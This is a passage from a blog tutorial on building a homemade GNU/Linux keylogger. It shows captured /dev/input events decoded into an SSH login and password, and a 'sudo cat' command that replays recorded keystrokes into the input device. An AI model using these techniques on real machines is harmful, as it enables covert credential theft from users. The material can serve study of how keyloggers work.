+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>$ ./keyboard.py 
+<span class=o>==============</span> <span class=nv>RAW</span> <span class=o>===============</span>	
+1650296356	797828	4	4	458792	
+1650296356	797828	1	28	0	
+1650296356	797828	0	0	0	
+1650296357	789872	4	4	458774	
+1650296357	789872	1	31	1	s
+1650296357	789872	0	0	0	
+1650296357	821873	4	4	458774	
+1650296357	821873	1	31	0	
+1650296357	821873	0	0	0	
+1650296357	917883	4	4	458774	
+1650296357	917883	1	31	1	s
+...
+<span class=o>===============</span> <span class=nv>DECODED</span> <span class=o>==============</span>
+ssh kali&lt;AltGr&gt;à192.168.1.254
+yes
+kali123!!
+&lt;CTRL&gt;c
+</code></pre></td></tr></table></div></div><p>In the decoded part, we were able to successfully recover an SSH authentication (login and password). Of course, it will require an extra effort to understand all the special characters.</p><p>For example, <code>&lt;AltGr>à</code> means <code>@</code> in the above example, but you have the general understanding 🤠.</p><h3 id=alternative-way--replay-attack>Alternative way : Replay Attack</h3><p>Another way to decode the keyboard data stream would be to inject the contents of <code>/tmp/keylogger.raw</code> into <code>/dev/input</code> to replay the recorded keystrokes directly into your own input stream :</p><p><code>$ sudo cat /tmp/keylogger.raw > /dev/input/event0</code></p><p>I strongly recommend that you give yourself some time to open an editor (<code>sleep 10</code> ?). Don&rsquo;t choose nano or vim because your local editor may interpret the stream as being addressed to itself.</p><figure><img src=/images/security/linux-keylogger/pwned-small.gif alt="denial of service attack"><figcaption><p>Avoid using your terminal to decode keytrokes 😉</p></figcaption></figure><p>Instead, use a graphical editor like mousepad, leafpad or even gedit or kate. This way, you will see &ldquo;:q&rdquo; or &ldquo;ctrl + x&rdquo; without affecting your editor. You will then see the keystrokes magically appear on your screen.</p><h2 id=because-im-not-a-rocket-scientist-the-references>Because I&rsquo;m not a rocket scientist, the references</h2><ul><li><a href=https://www.kernel.org/doc/Documentation/input/input.txt>https://www.kernel.org/doc/Documentation/input/input.txt</a> (GNU/Linux official documentation on input)</li><li><a href=https://www.aldeid.com/wiki/Dev-input>https://www.aldeid.com/wiki/Dev-input</a> (for the base python script)</li><li><a href=https://wikipedia.org/wiki/Keylogger>https://wikipedia.org/wiki/Keylogger</a> (for some general knownledge)</li></ul><h2 id=make-a-good-action->Make a good action !</h2><hr><p>Hit that <code>CTRL + D</code> to bookmark this website 🔖</p><p>Internet is for sharing, so please consider sharing this post if you liked it !</p><p>It will be so much better than any newsletter #privacy #spam #planet 🌍 ❤️</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-04-16</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/ data-title="GNU/Linux Homemade Keylogger" data-hashtags=linux,system,keylogger,diy><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/ data-hashtag=linux><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/><i class="fab fa-reddit fa-fw"></i></a><a href=javascript:void(0); title="Share on VK" data-sharer=vk data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/ data-title="GNU/Linux Homemade Keylogger" data-caption="I'm going to list three methods from the most stealthy and less effective to the less stealthy and most effective to gather an email address using GitHub." data-image=/images/security/linux-keylogger/linux-keylogger.webp><i class="fab fa-vk fa-fw"></i></a><a href=javascript:void(0); title="Share on Pocket" data-sharer=pocket data-url=https://spyfox.me/posts/cybersecurity/offensive/system/gnu-linux-homemade-keylogger/><i class="fab fa-get-pocket fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/linux/>linux</a>,&nbsp;<a href=/tags/system/>system</a>,&nbsp;<a href=/tags/keylogger/>keylogger</a>,&nbsp;<a href=/tags/diy/>diy</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/cybersecurity/offensive/red-team/osint/hide-your-email-address-on-github/ class=prev rel=prev title="OSINT : Hide your email address on GitHub"><i class="fas fa-angle-left fa-fw"></i>OSINT : Hide your email address on GitHub</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank> SpyF0x </a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc-nd/4.0/ target=_blank>CC BY-NC-ND 4.0</a></span><span class=icp-splitter>&nbsp;|&nbsp;</span><br class=icp-br><span class=icp><a href=/posts/disclaimer>Disclaimer</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
